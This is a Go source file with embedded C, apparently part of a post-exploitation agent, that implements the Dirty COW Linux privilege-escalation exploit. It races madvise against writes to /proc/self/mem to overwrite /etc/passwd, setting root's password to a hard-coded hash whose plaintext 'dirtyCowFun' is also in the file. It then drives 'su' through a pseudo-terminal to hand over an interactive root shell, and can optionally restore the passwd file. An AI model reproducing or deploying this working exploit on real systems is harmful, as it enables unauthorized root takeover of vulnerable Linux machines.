// -----------------------------------------------------------------
// Copyright (C) 2017  Gabriele Bonacini
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 3 of the License, or
// (at your option) any later version.
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software Foundation,
// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
// -----------------------------------------------------------------

// modified by jm33-ng

package agent

/*
#cgo LDFLAGS:  -lutil
#include <sys/types.h>
#include <pwd.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <termios.h>
#include <string.h>
#include <pty.h>

char* cGetUsrName(){
	struct passwd*  userId  = getpwuid(getuid());
	return userId->pw_name;
}

void* map    =  NULL;
bool  run    =  true;

void cMadviser(char* pwdfile, int len){
	int   fd     = open(pwdfile, O_RDONLY);
	map    = mmap(NULL, len, PROT_READ,MAP_PRIVATE, fd, 0);

	while(run){ madvise(map, len, MADV_DONTNEED);}
	close(fd);
}

void cWriter(char* psm, char* pwd, int size){
	int fpsm = open(psm, O_RDWR);
	while(run){
		lseek(fpsm, (off_t)map, SEEK_SET);
		(void) write(fpsm, pwd, size);
	}
}

void stopAll(void){ run   =  false; }

void exitOnError(char* msg){
	perror(msg);
	exit(EXIT_FAILURE);
}

enum SETTINGS{ BUFFSIZE=1024 };
const char* DISABLEWB  =    "echo 0 > /proc/sys/vm/dirty_writeback_centisecs\n";
const char* EXITCMD    =    "exit\n";
struct termios    termOld,
termNew;
bool              rawMode = false;

void cOpenTern(const char* cpcmd, const char* rmcmd, const char* pwd, bool opShell, bool restPwd){
	int   master;
	pid_t child = forkpty(&master, NULL, NULL, NULL);

	if(child == -1) exitOnError("Error forking pty.");

	if(child == 0){
		execlp("su", "su", "-", NULL);
		exitOnError("Error on exec.");
	}

	char              buffv[BUFFSIZE];
	memset(buffv, 0, BUFFSIZE);
	ssize_t bytes_read = read(master, buffv, BUFFSIZE - 1);
	if(bytes_read <= 0) exitOnError("Error reading  su prompt.");
	fprintf(stderr, "Received su prompt (%s)\n", buffv);

	if(write(master, pwd, strlen(pwd)) <= 0)
	exitOnError("Error writing pwd on tty.");

	if(write(master, DISABLEWB, strlen(DISABLEWB)) <= 0)
	exitOnError("Error writing cmd on tty.");

	if(!opShell){
		if(write(master, EXITCMD, strlen(EXITCMD)) <= 0)
		exitOnError("Error writing exit cmd on tty.");
	}else{
		if(!restPwd){
			if(write(master, cpcmd, strlen(cpcmd)) <= 0)
			exitOnError("Error writing restore cmd on tty.");
			if(write(master, rmcmd, strlen(rmcmd)) <= 0)
			exitOnError("Error writing restore cmd (rm) on tty.");
		}

		if(tcgetattr(STDIN_FILENO, &termOld) == -1 )
		exitOnError("Error getting terminal attributes.");

		termNew               = termOld;
		termNew.c_lflag      &= (unsigned long)(~(ICANON | ECHO));

		if(tcsetattr(STDIN_FILENO, TCSANOW, &termNew) == -1)
		exitOnError("Error setting terminal in non-canonical mode.");

		rawMode               = true;

		while(true){
			fd_set            rfds;
			FD_ZERO(&rfds);
			FD_SET(master, &rfds);
			FD_SET(STDIN_FILENO, &rfds);

			if(select(master + 1, &rfds, NULL, NULL, NULL) < 0 )
			exitOnError("Error on select tty.");

			if(FD_ISSET(master, &rfds)) {
				memset(buffv, 0, BUFFSIZE);
				bytes_read = read(master, buffv, BUFFSIZE - 1);
				if(bytes_read <= 0) break;
				if(write(STDOUT_FILENO, buffv, bytes_read) != bytes_read)
				exitOnError("Error writing on stdout.");
			}

			if(FD_ISSET(STDIN_FILENO, &rfds)) {
				memset(buffv, 0, BUFFSIZE);
				bytes_read = read(STDIN_FILENO, buffv, BUFFSIZE - 1);
				if(bytes_read <= 0) exitOnError("Error reading from stdin.");
				if(write(master, buffv, bytes_read) != bytes_read) break;
			}
		}
	}
}

void  cResetTer(void){ if(rawMode)    tcsetattr(STDIN_FILENO, TCSANOW, &termOld); }

*/
import "C"

import (
	"bufio"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"
)

const (
	// DEFPWD hashed password of `dirtyCowFun`
	DEFPWD = "$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/"
	// ROOTID root user name in passwd line
	ROOTID = "root:"
	// SSHDID sshd user name in passwd line
	SSHDID = "sshd:"
	// TMPBAKFILE if passwd file is not going to be restored
	TMPBAKFILE = "/tmp/.ssh_bak"
	// BAKFILE if passwd file is supposed to be restored
	BAKFILE = "./.ssh_bak"
	// PSM proc mem
	PSM = "/proc/self/mem"
	// PWDFILE the target passwd file
	PWDFILE = "/etc/passwd"
	// MAXITER max iteration count
	MAXITER = 300
	// DEFSLTIME sleep time of checker
	DEFSLTIME = 300000
	// CPCMD /bin/cp
	CPCMD = "\\cp "
	// RMCMD rm
	RMCMD = "\\rm "
	// TXTPWD plain text password of the new user
	TXTPWD = "dirtyCowFun\n"
)

func exitOnError(e error) {
	if e != nil {
		log.Println(e)
	}
}

// Getpwuid ssj
func Getpwuid() string { return C.GoString(C.cGetUsrName()) }

// ParsePwd parse passwd line
func ParsePwd(id *string, restPwd bool) (string, int) {
	etcPasswd, err := os.Open(PWDFILE)
	exitOnError(err)
	var bakFile string
	if restPwd {
		bakFile = BAKFILE
	} else {
		bakFile = TMPBAKFILE
	}
	backup, err := os.Create(bakFile)
	exitOnError(err)
	rstream := bufio.NewReader(etcPasswd)

	var (
		header  string
		footer  string
		pwdSize int
	)

	for line, err := rstream.ReadString('\n'); err != io.EOF; line, err = rstream.ReadString('\n') {
		err = backup.WriteString(line)
		if err != nil {
			log.Print(err)
		}
		pwdSize = pwdSize + len(line)
		if strings.Index(line, ROOTID) == 0 {
			header = header + ROOTID + DEFPWD + line[len(ROOTID)+1:]
		} else if strings.Index(line, *id) == 0 || strings.Index(line, SSHDID) == 0 {
			header = header + line
		} else {
			footer = footer + line
		}
	}

	defer etcPasswd.Close()
	defer backup.Close()
	return header + footer, pwdSize
}

// Expl exploit struct
type Expl struct {
	ID, NewPwd     string
	PwdFSize, Iter int
}

// NewExpl init Expl, for exploit
func NewExpl(restPwd bool) *Expl {
	var err error
	ex := new(Expl)
	ex.ID = Getpwuid() + ":"
	ex.NewPwd, ex.PwdFSize = ParsePwd(&ex.ID, restPwd)
	exitOnError(err)

	return ex
}

// Madviser the madviser thread
func (ex Expl) Madviser() { C.cMadviser(C.CString(PWDFILE), C.int(ex.PwdFSize)) }

// Writer writer thread
func (ex Expl) Writer() { C.cWriter(C.CString(PSM), C.CString(ex.NewPwd), C.int(ex.PwdFSize)) }

// Checker check if passwd line is overwritten
func (ex Expl) Checker() {
	for ex.Iter <= MAXITER {
		buff, err := ioutil.ReadFile(PWDFILE)
		exitOnError(err)
		if strings.Contains(string(buff), DEFPWD) {
			break
		}
		ex.Iter++
		time.Sleep(DEFSLTIME)
	}
	C.stopAll()
}

// Shell launche shell
func (ex Expl) Shell(opShell, restPwd bool) {
	C.cOpenTern(C.CString(CPCMD+TMPBAKFILE+" "+PWDFILE+"\n"),
		C.CString(RMCMD+TMPBAKFILE+"\n"),
		C.CString(TXTPWD),
		C.bool(opShell),
		C.bool(restPwd))
}

// RestoreTerm restore terminal, as `su` completes
func (ex Expl) RestoreTerm() { C.cResetTer() }
